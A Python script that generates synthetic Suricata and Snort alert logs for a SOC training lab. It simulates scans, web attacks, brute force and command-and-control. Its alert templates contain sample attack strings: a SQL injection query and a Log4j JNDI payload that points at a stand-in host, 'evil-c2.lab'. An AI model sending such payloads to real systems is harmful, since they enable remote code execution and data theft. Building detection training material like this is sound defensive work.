"""
Master Traffic & Synthetic Log Generator for SOC Lab
Generates high-fidelity realistic Suricata EVE JSON and Snort 3 logs representing:
1. Reconnaissance Phase (Nmap Port Scans, Ping Sweeps)
2. Weaponization & Initial Access (SQL Injection, XSS, Log4j RCE)
3. Exploitation & Privilege Escalation (SSH Brute Force, Shell Execution)
4. Command & Control / Data Exfiltration (DNS Tunneling, Cobalt Strike Beacon)
"""

import json
import os
import random
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path


ATTACKERS = [
    ("198.51.100.44", "CobaltStrike_Actor"),
    ("203.0.113.88", "Mirai_Scanner"),
    ("45.33.32.156", "External_Recon_Host"),
    ("185.220.101.5", "Tor_Exit_Node_Attacker"),
]

TARGETS = [
    ("192.168.1.10", 80, "HTTP"),
    ("192.168.1.10", 443, "HTTPS"),
    ("192.168.1.20", 22, "SSH"),
    ("192.168.1.30", 3306, "MySQL"),
]


def generate_synthetic_soc_logs(
    eve_path: Path = Path("logs/suricata/eve.json"),
    snort_path: Path = Path("logs/snort/alert_json.txt"),
    count: int = 40
):
    eve_path.parent.mkdir(parents=True, exist_ok=True)
    snort_path.parent.mkdir(parents=True, exist_ok=True)

    base_time = datetime.now(timezone.utc) - timedelta(minutes=45)
    
    suricata_events = []
    snort_events = []

    print(f"[*] Generating {count} realistic SOC alerts across Suricata and Snort...")

    attack_templates = [
        # Recon
        {
            "stage": "Recon",
            "suri_sig": "SOC-SCAN: Nmap Stealth NULL Scan Detected (No Flags)",
            "snort_sig": "SNORT-SCAN: Nmap Stealth NULL Scan",
            "suri_sid": 1000101,
            "snort_sid": 2000020,
            "category": "Attempted Information Leak",
            "suri_sev": 3,
            "proto": "TCP",
            "mitre": "T1046",
        },
        {
            "stage": "Recon",
            "suri_sig": "SOC-SCAN: Automated Vulnerability Scanner - Nikto Detected",
            "snort_sig": "SNORT-SCAN: Automated Vulnerability Scanner Nikto",
            "suri_sid": 1000110,
            "snort_sid": 2000021,
            "category": "Web Application Activity",
            "suri_sev": 4,
            "proto": "TCP",
            "mitre": "T1595",
            "http": {"hostname": "victim-shop.local", "url": "/nikto-test-probe.html", "http_user_agent": "Nikto/2.1.6"},
        },
        # Web Attack (SQLi / XSS / LFI / Log4j)
        {
            "stage": "Initial Access",
            "suri_sig": "SOC-ATTACK: Web SQL Injection - UNION SELECT Attempt",
            "snort_sig": "SNORT-ATTACK: Web SQL Injection UNION SELECT",
            "suri_sid": 1000001,
            "snort_sid": 2000010,
            "category": "Web Application Attack",
            "suri_sev": 2,
            "proto": "TCP",
            "mitre": "T1190",
            "http": {"hostname": "victim-shop.local", "url": "/rest/products/search?q=apple'+UNION+SELECT+1,2,3,database()--", "http_user_agent": "Mozilla/5.0"},
        },
        {
            "stage": "Initial Access",
            "suri_sig": "SOC-ATTACK: Remote Code Execution - Apache Log4j JNDI Lookup (${jndi:})",
            "snort_sig": "SNORT-ATTACK: Apache Log4j JNDI RCE Attempt",
            "suri_sid": 1000040,
            "snort_sid": 2000013,
            "category": "Attempted Administrator Privilege Gain",
            "suri_sev": 1,
            "proto": "TCP",
            "mitre": "T1190",
            "http": {"hostname": "victim-shop.local", "url": "/api/v1/health", "http_user_agent": "${jndi:ldap://evil-c2.lab:1389/Exploit}"},
        },
        # Brute Force
        {
            "stage": "Credential Access",
            "suri_sig": "SOC-ATTACK: SSH Brute Force Attack - High Frequency Connection",
            "snort_sig": "SNORT-ATTACK: SSH Brute Force Rate Exceeded",
            "suri_sid": 1000120,
            "snort_sid": 2000025,
            "category": "Attempted Administrator Privilege Gain",
            "suri_sev": 2,
            "proto": "TCP",
            "mitre": "T1110",
        },
        # C2 & Exfil
        {
            "stage": "C2 & Exfil",
            "suri_sig": "SOC-MALWARE: Suspicious Abnormally Long DNS Query (Potential DNS Tunneling/Exfil)",
            "snort_sig": "SNORT-MALWARE: Suspicious DNS Tunneling Query",
            "suri_sid": 1000201,
            "snort_sid": 2000035,
            "category": "A Network Trojan was detected",
            "suri_sev": 2,
            "proto": "UDP",
            "mitre": "T1071.004",
        },
        {
            "stage": "C2 & Exfil",
            "suri_sig": "SOC-MALWARE: Interactive Reverse Shell Session Established (sh/bash prompt)",
            "snort_sig": "SNORT-MALWARE: Interactive Reverse Shell /bin/sh",
            "suri_sid": 1000210,
            "snort_sid": 2000030,
            "category": "A Network Trojan was detected",
            "suri_sev": 1,
            "proto": "TCP",
            "mitre": "T1059.004",
        },
    ]

    current_time = base_time
    for i in range(count):
        tmpl = random.choice(attack_templates)
        attacker_ip, _ = random.choice(ATTACKERS)
        target_ip, target_port, _ = random.choice(TARGETS)
        src_port = random.randint(30000, 65000)

        current_time += timedelta(seconds=random.randint(15, 75))
        iso_time = current_time.isoformat() + "Z"

        # 1. Suricata Event
        suri_record = {
            "timestamp": iso_time,
            "flow_id": random.randint(100000000000000, 999999999999999),
            "event_type": "alert",
            "src_ip": attacker_ip,
            "src_port": src_port,
            "dest_ip": target_ip,
            "dest_port": target_port,
            "proto": tmpl["proto"],
            "community_id": f"1:synthetic_{random.randint(1000, 9999)}",
            "alert": {
                "action": "allowed",
                "gid": 1,
                "signature_id": tmpl["suri_sid"],
                "rev": 1,
                "signature": tmpl["suri_sig"],
                "category": tmpl["category"],
                "severity": tmpl["suri_sev"],
                "metadata": {
                    "attack_technique": [tmpl.get("mitre", "T1000")],
                }
            }
        }
        if "http" in tmpl:
            suri_record["http"] = tmpl["http"]
        suricata_events.append(suri_record)

        # 2. Snort Event (Every 2nd alert)
        if i % 2 == 0:
            snort_record = {
                "timestamp": iso_time,
                "action": "allow",
                "class": tmpl["category"],
                "gid": 1,
                "sid": tmpl["snort_sid"],
                "rev": 1,
                "msg": tmpl["snort_sig"],
                "proto": tmpl["proto"],
                "src_addr": attacker_ip,
                "src_port": src_port,
                "dst_addr": target_ip,
                "dst_port": target_port,
            }
            snort_events.append(snort_record)

    # Write Suricata EVE
    with open(eve_path, "w", encoding="utf-8") as f:
        for ev in suricata_events:
            f.write(json.dumps(ev) + "\n")

    # Write Snort alerts
    with open(snort_path, "w", encoding="utf-8") as f:
        for ev in snort_events:
            f.write(json.dumps(ev) + "\n")

    print(f"[+] Successfully wrote {len(suricata_events)} Suricata EVE records to {eve_path}")
    print(f"[+] Successfully wrote {len(snort_events)} Snort alert records to {snort_path}")


if __name__ == "__main__":
    generate_synthetic_soc_logs()
